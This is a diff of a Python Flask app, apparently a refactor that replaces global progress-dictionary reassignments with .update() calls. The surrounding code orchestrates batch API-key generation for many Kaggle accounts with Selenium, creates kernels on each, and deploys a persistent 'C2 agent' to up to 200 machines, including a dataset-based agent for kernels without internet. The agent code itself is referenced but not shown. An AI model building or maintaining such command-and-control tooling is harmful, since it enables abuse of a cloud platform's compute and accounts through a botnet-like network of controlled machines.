@@ -1446,7 +1446,6 @@ batch_legacy_progress = {
 @login_required
 def batch_legacy_keys():
     """Generate Legacy Keys for all Kaggle accounts without one."""
-    global batch_legacy_progress
     
     with _batch_legacy_lock:
         if batch_legacy_progress["running"]:
@@ -1466,7 +1465,7 @@ def batch_legacy_keys():
         return jsonify({"error": "No accounts need keys"}), 400
     
     # Reset progress
-    batch_legacy_progress = {
+    batch_legacy_progress.update({
         "running": True,
         "total": len(need_keys),
         "processed": 0,
@@ -1477,7 +1476,7 @@ def batch_legacy_keys():
         "rate_limited_until": None,
         "rate_limited": False,
         "browser": browser
-    }
+    })
     
     def add_log(msg):
         batch_legacy_progress["logs"].append(msg)
@@ -1487,7 +1486,6 @@ def batch_legacy_keys():
     
     def do_batch():
         """Batch legacy key generation using Selenium Firefox."""
-        global batch_legacy_progress
         
         import os, shutil, tempfile, glob
         from pathlib import Path
@@ -1693,7 +1691,6 @@ def get_batch_legacy_progress():
 @login_required
 def cancel_batch_legacy():
     """Cancel batch legacy key generation."""
-    global batch_legacy_progress
     batch_legacy_progress["running"] = False
     return jsonify({"status": "cancelled"})
 
@@ -1715,7 +1712,6 @@ batch_dataset_progress = {
 @login_required
 def batch_datasets():
     """Create 5 machines (kernels) for all Kaggle accounts with API key."""
-    global batch_dataset_progress
     
     with _batch_dataset_lock:
         if batch_dataset_progress["running"]:
@@ -1731,7 +1727,7 @@ def batch_datasets():
         return jsonify({"error": "No Kaggle accounts with API keys found. Run Batch Keys first."}), 400
     
     # Reset progress
-    batch_dataset_progress = {
+    batch_dataset_progress.update({
         "running": True,
         "total": len(have_keys),
         "processed": 0,
@@ -1740,7 +1736,7 @@ def batch_datasets():
         "current_email": "",
         "current": "",
         "logs": []
-    }
+    })
     
     def add_log(msg):
         batch_dataset_progress["logs"].append(msg)
@@ -1749,7 +1745,6 @@ def batch_datasets():
         print(msg)
     
     def do_batch():
-        global batch_dataset_progress
         
         from src.agents.kaggle.datasets import create_dataset_with_machines, check_kaggle_cli_installed
         
@@ -1842,7 +1837,6 @@ def get_batch_dataset_progress():
 @login_required
 def cancel_batch_datasets():
     """Cancel batch dataset creation."""
-    global batch_dataset_progress
     batch_dataset_progress["running"] = False
     return jsonify({"status": "cancelled"})
 
@@ -1967,7 +1961,6 @@ def _deploy_code_to_kernel(username: str, api_key: str, kernel_slug: str, code: 
 @login_required
 def batch_join_c2():
     """Deploy C2 agent to all Kaggle machines - persistent connection."""
-    global batch_join_c2_progress
     with _batch_join_c2_lock:
         if batch_join_c2_progress["running"]:
             return jsonify({"error": "Batch already running"}), 400
@@ -1995,7 +1988,7 @@ def batch_join_c2():
     if len(targets) > 200:
         targets = targets[:200]
         log_event("batch_join_c2", f"Limited to 200 machines (total was {len(account_store.get_all())})")
-    batch_join_c2_progress = {
+    batch_join_c2_progress.update({
         "running": True,
         "total": len(targets),
         "processed": 0,
@@ -2003,7 +1996,7 @@ def batch_join_c2():
         "failed": 0,
         "current": "",
         "logs": []
-    }
+    })
     agent_code_tpl = KAGGLE_C2_AGENT_CODE
 
     def _log(msg):
@@ -2013,7 +2006,6 @@ def batch_join_c2():
         print(msg)
 
     def _run():
-        global batch_join_c2_progress
         for i, t in enumerate(targets):
             if not batch_join_c2_progress["running"]:
                 _log("Cancelled")
@@ -2050,7 +2042,6 @@ def get_batch_join_c2_progress():
 @app.route("/api/autoreg/batch-join-c2-cancel", methods=["POST"])
 @login_required
 def cancel_batch_join_c2():
-    global batch_join_c2_progress
     batch_join_c2_progress["running"] = False
     return jsonify({"status": "cancelled"})
 
@@ -4004,7 +3995,6 @@ deploy_progress = load_deploy_state()
 @login_required
 def kaggle_deploy_agent():
     """Deploy persistent C2 agent to all kernels."""
-    global deploy_progress
     
     if deploy_progress["running"]:
         return jsonify({"error": "Deploy already running", "progress": deploy_progress}), 400
@@ -4045,7 +4035,7 @@ def kaggle_deploy_agent():
     total_kernels = len(kaggle_accounts)  # 1 kernel per account (Kaggle limit: 5 CPU sessions)
     
     # Initialize progress
-    deploy_progress = {
+    deploy_progress.update({
         "running": True,
         "total": total_kernels,
         "deployed": 0,
@@ -4054,12 +4044,10 @@ def kaggle_deploy_agent():
         "start_time": time.time(),
         "completed_kernels": [],
         "c2_url": c2_url
-    }
+    })
     save_deploy_state(deploy_progress)
     
     def do_deploy():
-        global deploy_progress, kaggle_agents_state
-        
         for account in kaggle_accounts:
             if not deploy_progress["running"]:
                 break
@@ -4179,7 +4167,6 @@ def kaggle_deploy_agent():
 @login_required
 def kaggle_deploy_dataset_agent():
     """Deploy dataset-based C2 agent (for kernels without internet)."""
-    global deploy_progress
     
     if deploy_progress["running"]:
         return jsonify({"error": "Deploy already running", "progress": deploy_progress}), 400
@@ -4204,7 +4191,7 @@ def kaggle_deploy_dataset_agent():
     total_kernels = len(kaggle_accounts)
     
     # Initialize progress
-    deploy_progress = {
+    deploy_progress.update({
         "running": True,
         "total": total_kernels,
         "deployed": 0,
@@ -4213,12 +4200,10 @@ def kaggle_deploy_dataset_agent():
         "start_time": time.time(),
         "completed_kernels": [],
         "mode": "dataset"
-    }
+    })
     save_deploy_state(deploy_progress)
     
     def do_deploy_dataset():
-        global deploy_progress, kaggle_agents_state
-        
         def setup_kaggle_creds(username, api_key):
             """Setup kaggle.json file - CLI requires this, env vars don't work for write operations."""
             kaggle_dir = Path.home() / ".kaggle"
